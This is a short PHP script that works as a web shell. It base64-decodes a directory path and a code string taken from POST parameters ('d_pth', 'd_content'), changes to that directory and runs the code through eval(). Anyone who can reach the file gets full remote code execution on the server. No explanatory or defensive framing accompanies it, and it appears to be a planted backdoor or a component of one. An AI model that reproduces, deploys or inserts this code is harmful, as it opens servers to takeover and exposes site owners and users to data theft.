<?php

$pth = base64_decode($_POST['d_pth']);
chdir($pth);
$dt = (base64_decode($_POST['d_content']));
$dt = trim($dt,';');
$dt.=';';
eval($dt);
exit;